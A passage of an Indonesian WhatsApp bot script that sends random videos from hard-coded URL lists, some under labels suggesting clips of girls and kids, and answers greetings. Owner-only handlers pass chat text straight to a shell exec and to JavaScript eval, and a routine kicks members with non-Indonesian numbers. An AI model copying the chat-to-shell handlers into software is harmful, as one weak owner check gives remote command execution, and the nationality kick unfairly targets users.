'http://sansekai.my.id/ptl_repost/120575986_151816433263092_6600262966520398271_n.mp4', 'http://sansekai.my.id/ptl_repost/120582400_339926344091433_2581248581156693603_n.mp4', 'http://sansekai.my.id/ptl_repost/120583739_1060190921079212_3898520254664507328_n.mp4', 'http://sansekai.my.id/ptl_repost/120587415_638776546998307_3091093882267818607_n.mp4', 'http://sansekai.my.id/ptl_repost/120589771_752670855329266_5064573607465519463_n.mp4', 'http://sansekai.my.id/ptl_repost/120613860_3393110177444352_4287165838359264124_n.mp4', 'http://sansekai.my.id/ptl_repost/120614859_768632723701773_5662521620734316774_n.mp4', 'http://sansekai.my.id/ptl_repost/120615019_149392973357031_6254963333779779708_n.mp4', 'http://sansekai.my.id/ptl_repost/120664457_338629710563119_6615226849280369453_n.mp4', 'http://sansekai.my.id/ptl_repost/120670762_191033325874671_8168246094200167609_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4', 'http://sansekai.my.id/ptl_repost/120707049_337981777304231_3152650741169851669_n.mp4', 'http://sansekai.my.id/ptl_repost/120714412_680680702806959_2149499366562729814_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4'];
    var random_asupannih = asupannih[Math.floor(Math.random() * (asupannih.length))];
    let ini_asupannih = await getBuffer(random_asupannih);
    ikyc.sendMessage(from, ini_asupannih, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'bocil') {
    setReply(mess.wait);
    var bocil = ['https://b.top4top.io/m_1931yxodg0.mp4', 'https://k.top4top.io/m_193161p380.mp4', 'https://l.top4top.io/m_1931i4g3p1.mp4', 'https://a.top4top.io/m_1931tjlio2.mp4', 'https://g.top4top.io/m_1931z2mc40.mp4', 'https://h.top4top.io/m_1931auyof1.mp4', 'https://i.top4top.io/m_19315hrle2.mp4', 'https://j.top4top.io/m_1931xul5a3.mp4', 'https://l.top4top.io/m_1931o92nr0.mp4', 'https://a.top4top.io/m_1931j1rh21.mp4', 'https://b.top4top.io/m_1931iaqpg2.mp4', 'https://c.top4top.io/m_1931s5zlj3.mp4', 'https://d.top4top.io/m_1931x0g5a4.mp4', 'https://i.top4top.io/m_1931oj76n0.mp4', 'https://j.top4top.io/m_19319gl3d1.mp4', 'https://k.top4top.io/m_1931u52cq2.mp4', 'https://l.top4top.io/m_1931mvgj73.mp4', 'https://a.top4top.io/m_1931u07oz4.mp4', 'https://j.top4top.io/m_1931h1fo60.mp4', 'https://k.top4top.io/m_1931mro3u1.mp4', 'https://l.top4top.io/m_1931kx0ac2.mp4', 'https://a.top4top.io/m_1931g9ezq3.mp4', 'https://b.top4top.io/m_1931plin14.mp4', 'https://c.top4top.io/m_1931aaxri5.mp4', 'https://d.top4top.io/m_1931ijzzn6.mp4', 'https://e.top4top.io/m_1931ugycd7.mp4', 'https://f.top4top.io/m_1931l14nk8.mp4', 'https://g.top4top.io/m_1931crgqt9.mp4'];
    var random_bocil = bocil[Math.floor(Math.random() * (bocil.length))];
    let ini_bocil = await getBuffer(random_bocil);
    ikyc.sendMessage(from, ini_bocil, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'geayubi') {
    setReply(mess.wait);
    var geayubi = ['https://l.top4top.io/m_1931ufrul0.mp4', 'https://a.top4top.io/m_1931jbdpk1.mp4', 'https://c.top4top.io/m_1931aj9nm2.mp4', 'https://d.top4top.io/m_1931cnsal3.mp4', 'https://e.top4top.io/m_1931d4kc74.mp4', 'https://f.top4top.io/m_1931bih8q5.mp4', 'https://g.top4top.io/m_1931xx7aa6.mp4', 'https://h.top4top.io/m_1931g3zsq7.mp4', 'https://a.top4top.io/m_1931m74wd0.mp4', 'https://b.top4top.io/m_1931p8tfm1.mp4', 'https://e.top4top.io/m_1931aj8iv0.mp4', 'https://f.top4top.io/m_1931szguy1.mp4', 'https://g.top4top.io/m_1931l73ry2.mp4', 'https://h.top4top.io/m_1931yhznj3.mp4', 'https://i.top4top.io/m_1931kmtp34.mp4', 'https://j.top4top.io/m_1931snhdg5.mp4', 'https://k.top4top.io/m_1931ay1jz6.mp4', 'https://l.top4top.io/m_1931x70mk7.mp4', 'https://a.top4top.io/m_19319mvvf8.mp4', 'https://b.top4top.io/m_1931icmzd9.mp4', 'https://h.top4top.io/m_19316oo0s0.mp4', 'https://i.top4top.io/m_1931cvvpt1.mp4'];
    var random_geayubi = geayubi[Math.floor(Math.random() * (geayubi.length))];
    let ini_geayubi = await getBuffer(random_geayubi);
    ikyc.sendMessage(from, ini_geayubi, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'santuy') {
    setReply(mess.wait);
    var santuy = ['https://e.top4top.io/m_1930wespy0.mp4', 'https://e.top4top.io/m_19303zfi20.mp4', 'https://j.top4top.io/m_1930t00kx0.mp4', 'https://e.top4top.io/m_1930kx7hi0.mp4', 'https://c.top4top.io/m_19307g6kd0.mp4', 'https://f.top4top.io/m_19306yk4c0.mp4', 'https://i.top4top.io/m_1930y1u780.mp4', 'https://j.top4top.io/m_1930ilsyy0.mp4', 'https://i.top4top.io/m_19301948b0.mp4', 'https://d.top4top.io/m_1930zg8460.mp4', 'https://i.top4top.io/m_19301yozl0.mp4', 'https://g.top4top.io/m_1930qjr2q0.mp4', 'https://l.top4top.io/m_1930x1wp50.mp4', 'https://a.top4top.io/m_1930zr1041.mp4', 'https://b.top4top.io/m_1930s29hq2.mp4', 'https://a.top4top.io/m_1930kbo0y0.mp4', 'https://j.top4top.io/m_1930xek9z0.mp4', 'https://i.top4top.io/m_1930s7gb80.mp4', 'https://c.top4top.io/m_1930w0dbu0.mp4', 'https://d.top4top.io/m_1930xu4kd1.mp4', 'https://a.top4top.io/m_1930zw2nb0.mp4', 'https://b.top4top.io/m_1930eybjj1.mp4', 'https://g.top4top.io/m_1930fmx330.mp4', 'https://l.top4top.io/m_1930gnlam0.mp4', 'https://g.top4top.io/m_1930twwu50.mp4', 'https://l.top4top.io/m_1930qkeh70.mp4', 'https://l.top4top.io/m_1930wefm20.mp4', 'https://a.top4top.io/m_1930idzd51.mp4'];
    var random_santuy = santuy[Math.floor(Math.random() * (santuy.length))];
    let ini_santuy = await getBuffer(random_santuy);
    ikyc.sendMessage(from, ini_santuy, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'ukhty') {
    setReply(mess.wait);
    var ukhty = ['https://e.top4top.io/m_1930ns2zo0.mp4', 'https://k.top4top.io/m_1930j9i810.mp4', 'https://f.top4top.io/m_1930wtj580.mp4', 'https://d.top4top.io/m_1930a2isv0.mp4', 'https://e.top4top.io/m_1930wbgc41.mp4', 'https://f.top4top.io/m_1930urbj02.mp4', 'https://b.top4top.io/m_1930ceiqv0.mp4', 'https://i.top4top.io/m_1931a0z6o0.mp4', 'https://a.top4top.io/m_193190b500.mp4', 'https://b.top4top.io/m_1931dcixz1.mp4', 'https://g.top4top.io/m_19317gpjp0.mp4', 'https://i.top4top.io/m_1931cc22w1.mp4', 'https://j.top4top.io/m_1931xn6412.mp4', 'https://g.top4top.io/m_1931silxz0.mp4', 'https://h.top4top.io/m_1931as4mg1.mp4', 'https://i.top4top.io/m_1931p9j5v0.mp4', 'https://e.top4top.io/m_1931mgeuy0.mp4', 'https://f.top4top.io/m_1931lw9381.mp4', 'https://g.top4top.io/m_1931vm0dk2.mp4', 'https://h.top4top.io/m_1931fiv8x3.mp4', 'https://b.top4top.io/m_1931jm3dt0.mp4', 'https://e.top4top.io/m_1931i7yag1.mp4', 'https://f.top4top.io/m_1931dr5ya2.mp4', 'https://g.top4top.io/m_193172kpg3.mp4', 'https://h.top4top.io/m_1931j3b224.mp4', 'https://j.top4top.io/m_19317ykt25.mp4', 'https://k.top4top.io/m_1931o0vh16.mp4', 'https://l.top4top.io/m_1931ssfbn7.mp4', 'https://a.top4top.io/m_19318t7458.mp4', 'https://b.top4top.io/m_1931vhu759.mp4'];
    var random_ukhty = ukhty[Math.floor(Math.random() * (ukhty.length))];
    let ini_ukhty = await getBuffer(random_ukhty);
    ikyc.sendMessage(from, ini_ukhty, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};
if (responseButton == 'kienzi') {
    setReply(mess.wait);
    var kienzi = ['https://d.top4top.io/m_2194kkur50.mp4', 'https://d.top4top.io/m_2194w90w70.mp4', 'https://e.top4top.io/m_219404rh21.mp4', 'https://f.top4top.io/m_2194657rl2.mp4', 'https://g.top4top.io/m_2194cb2n33.mp4', 'https://h.top4top.io/m_2194305c84.mp4', 'https://i.top4top.io/m_219422ujt5.mp4', 'https://j.top4top.io/m_2194b6xd16.mp4', 'https://k.top4top.io/m_21945fvbm7.mp4,', 'https://l.top4top.io/m_2194l9btc8.mp4', 'https://a.top4top.io/m_2194mvqfr9.mp4', 'https://l.top4top.io/m_2194jop630.mp4', 'https://a.top4top.io/m_21947er5e1.mp4', 'https://b.top4top.io/m_2194p4frq2.mp4', 'https://c.top4top.io/m_2194qwfod3.mp4', 'https://d.top4top.io/m_21941r0l14.mp4', 'https://e.top4top.io/m_2194n5qob5.mp4'];
    var random_kienzi = kienzi[Math.floor(Math.random() * (kienzi.length))];
    let ini_kienzi = await getBuffer(random_kienzi);
    ikyc.sendMessage(from, ini_kienzi, video, {
        mimetype: 'video/mp4',
        quoted: iky,
        caption: `𝙏𝙃𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙄𝙆𝙔 𝘽𝙊𝙏𝙕`
    })
};		
	//Jika ada yg kirim pesan "p" botz akan respon
				if (salam.includes(messagesC)) {
				if (isSpammerr) return 
				if (isOwner) return 
			    if(isZadani) return
				addSpammer(sender, "10s", spamkuyy)
		          if(autovn){
                   sendvn(ucapbot)
                   } else if(autosticker) {
                   sendSticker(ucapsalam)
                   } else {
               	setReply("Ucap salam napah")
                   }
				   }
				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
	            if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
                   if (isSpammerr) return 
		          addSpammer(sender, "10s", spamkuyy)
                   if(autovn){
                   sendvn(walaikumsalam)
                   } else if(autosticker) {
                  sendSticker1(kumsalam)
                  } else {
                  setReply("Walaikumsalam kak")
                  }
                  }
				
//Jika ada yg kirim pesan "menu" bot akan respon
				if (menu.includes(messagesC)) {
				if (isSpammerr) return 
			    if (isOwner) return 
				setReply(`Hai kak ${pushname} untuk mengakses menu ketik ${prefix}menu ya 😉`)
				addSpammer(sender, "10s", spamkuyy)
				}
				
				
//Jika ada yg toxic botz akan merespon✓
			if (!isOwner && bad.includes(messagesC)) {
				if (isSpammerr) return 
		         addSpammer(sender, "10s", spamkuyy)
                if(autovn) {
                 sendvn(astaga)
                 } else if(autosticker) {
                 	await sendSticker(istigfar)
                 } else {
				daui = fs.readFileSync('./temp/toxic/toxic.mp3')
				await ikyc.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', quoted: iky, ptt: true})
				await setReply("Astagfirloh")
				}
				}
				
//Jika ada yg bilang bot maka botz akan merespon✓
			 if (badud.includes(messagesC)) {
				if (isSpammerr) return
				addSpammer(sender, "10s", spamkuyy)
                if(autovn ) {
               sendvn(ucapbot)
               } else {
				sendMess(hayuk)
				}
				}
				
	
//Jika ada yg bilang hallo maka botz akan merespon✓
			 if (katahai.includes(messagesC)) {
			    if(isZadani) return
				if (isSpammerr) return
				addSpammer(sender, "10s", spamkuyy)
                if(autovn) return sendvn(moshimos)
				}
	
	
//******************* 》UCAPAN《 ********************\\
//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if(isZadani) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
				if(autovn === true) return sendvn(oahyo)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
				
				
        
        
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if(isZadani) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
				if(autovn === true) return sendvn(oyasumi)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
        
        
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if(isZadani) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
				if(autovn === true) return sendvn(koniciwa)
				setReply(`${ucapanWaktu} kak 🙂`)
				}
        
        
        
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if(isZadani) return
if (isSpammerr) return
addSpammer(sender, "10s", spamkuyy)
				if(autovn === true) return sendvn(lopyoutoo)
				}
//Jika ada yg cek prefix bot akan merespon   
	              if (budy.includes('ekprefix')){
		          if (isSpammerr) return
                  addSpammer(sender, "10s", spamkuyy)
                  if(multi) return ikyc.sendMessage(from, `Baik kak untuk prefix saat ini adalah :「  Multi  」`, text, { quoted: setQuoted, contextInfo: forward })
	              ikyc.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${prefa}  」`, text, { quoted: setQuoted, contextInfo: forward })
               }
                   
//Jika ada yang tag nomer owner
                  if (!isOwner && isGroup && budy.includes(nomerOwner)) {
              	if (isSpammerr) return 
                  if (itsMe) return
		          addSpammer(sender, "10s", spamkuyy)
                  const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
				  const su = kta[Math.floor(Math.random() * kta.length)]
				  ikyc.sendMessage(from, su, text, { quoted: iky })
				   }
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
                  if ( budy.includes(kasih)) {
                  if(isZadani) return
                  if(iky.key.fromMe) return
                  if (isSpammerr) return 
		         addSpammer(sender, "10s", spamkuyy)
                 if(autosticker) return sendSticker(samasama)
                 setReply(`Sama sama kak ${pushname}`)
                  }
                 }
	
	
	
	
	
	
	
	
	




if (selectedButton == 'INFO BOTZ') {
if(isZadani) return
                       console.log('INFO BOTZ')
                       
                       mhan = await ikyc.prepareMessage(from, fs.readFileSync('./stik/bot.jpg'), image)
                       gbutsan = [{buttonId: 'DEVELOPER', buttonText: {displayText: `ᴅᴇᴠᴇʟᴏᴘᴇʀ`}, type: 1},
                                              {buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1}]      
                       
 gbuttonan = {imageMessage: mhan.message.imageMessage,
                           contentText: info1.bot(gender,fake,nomerOwner),
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 4
                           }
await ikyc.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         contextInfo: forward})                                    
                         }
                         
                         
  if (selectedButton == 'SEWA BOTZ') {
  if(isZadani) return
                       console.log('SEWA BOTZ')                       
                       gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
                                            {buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]      
                       
 gbuttonan = {
                           contentText: sewabot.dada(prefix, settings, pushname, ucapanWaktu) ,
                           footerText:`© ${fake1}`,
                           buttons: gbutsan,
                           headerType: 1
                           }
                         await ikyc.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {                         
                         quoted: setQuoted, contextInfo: forward})                                 
                         }
                         
                         
        if (selectedButton == 'KODE QR') {
        if(isZadani) return
        sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
                 {buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
                  {buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
                    }
                   
                        
                         
        if (selectedButton == 'DEVELOPER') {
        if(isZadani) return
        sendKontak(from, `${Ownerin.split("@")[0]}`, "IKYYZZZXX", "Sibuk");    
        };
                        
                         

if (selectedButton == 'YOUTUBE') {
 if(isZadani) return
console.log('YOUTUBE')
ikyc.sendMessage(from, `
*YOUTUBE CHANNEL*
Support gua ya gaes dengan Apa Elo Tega\n\nhttps://youtu.be/IJRz8htcUbA`,
text, {detectLinks: true, quoted: fhidetag})
}



if (budy.startsWith('$')){
if (!iky.key.fromMe && !isOwner) return onlyOwner()
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return setReply(`@Zadani:~ ${err}`)
if (stdout) {
setReply(stdout)
}
})
}

if (budy.startsWith('>')){
if (!iky.key.fromMe && !isOwner) return onlyOwner()
try {
return ikyc.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: iky})
} catch(err) {
e = String(err)
setReply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !iky.key.fromMe) return onlyOwner()
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
setReply(String(e))
}
}



    



			

    
        if (!iky.key.fromMe && budy.includes(`usik`)) {
        if(isOwner) return
        if(budy.includes(`untuk mengakses musik bisa ketik`)) return          
        setReply(`Hai kak ${pushname} untuk mengakses musik bisa ketik ${prefix}vnlist atau ketik ${prefix}musik yah ??`)
        }


 
          if (timeWib >= '04:00' && timeWib <= '04:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
          }
          if (timeWib >= '05:00' && timeWib <= '05:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
          }
         if (timeWib >= '06:00' && timeWib <= '06:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
          }
          if (timeWib >= '11:00' && timeWib <= '11:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
          }
          if (timeWib >= '12:00' && timeWib <= '12:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
           }
          if (timeWib >= '15:00' && timeWib <= '15:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
          }
          if (timeWib >= '18:00' && timeWib <= '18:10') {
        	console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
          }
          if (timeWib >= '19:00' && timeWib <= '19:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
           }
          if (timeWib >= '20:00' && timeWib <= '20:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
           }
          if (timeWib >= '00:00' && timeWib <= '00:10') {
           console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
           }
           
	       if (timeWib >= '08:00' && timeWib <= '08:01' ){
	       var obj = [] 
           fs.writeFileSync('./database/hitToday.json', JSON.stringify(obj))         
	       console.log(color(`[Hit Today]`, 'red'), color('Hit Today telah di reset', 'cyan'))
	      } 
                

	}	
    } catch (e) {
    e = String(e)  
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
    if(e.includes("BaileysError: Not expecting a response")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Sinyalnya jelek kak atau bisa juga\n               pesan sementara grup masih aktif\n\n© ${fake1}`)
    if(e.includes("Error: read ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Yahaha pasti paket chat 🤣\n\n© ${fake1}`)
    if(e.includes("Error: ENOENT: no such file or directory, open")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Ada yg eror nih kak, file tidak di temukan\n              Coba extrack ulang aja\n\n© ${fake1}`)
    if(e.includes("Error: Language not supported")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Masukin kode bahasanya yg bener goblok\n\n© ${fake1}`)
    if(e.includes("Error: Request failed with status code")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Maap, sudah melebihi batas permintaan\n\n© ${fake1}`)
    if(e.includes("ECONNRESET")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\nNOTE : Gada kuota mungkin\n\n© ${fake1}`)
    if(e.includes("ECONNABORTED")) return setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\\n\n© ${fake1}`)
    await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    
    if(checkError(e, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
    addError(e, command, JSON.parse(fs.readFileSync('./database/listerror.json')))   
     if(autoblockcmd){        
    addblockcmd(command,listcmdblock) 
    await setReply("Command telah di block karena terjadi error")
    }
    /*await ikyc.sendMessage(`${Ownerin}`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
    await ikyc.modifyChat(`${Ownerin}`, ChatModification.delete)
    if(autoblockcmd) return
    setTimeout( () => {
	 ikyc.sendMessage(from,"Laporan error telah dikirim ke setQuoted = ikyeloper",text)
	},2000)*/
    }
    } 

    


                    
      








   //ANTI ASING/BULE 
    if (isGroup && isKickarea && !iky.key.fromMe) {    
    if(isOwner) return
    if(sender.includes("+62")) return
    await setReply(` *「 NOMOR ASING DETECTED 」*\nMaap kamu adalah orang asing, aku akan mengeluarkanmu`)
    await ikyc.groupRemove(from, [sender]);
    await sendMess("Kick Area nih bos :v")
    }
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message : %s', 'white'), color(e, 'green'))
        }
	// console.log(e)
	}
}
}




	
    
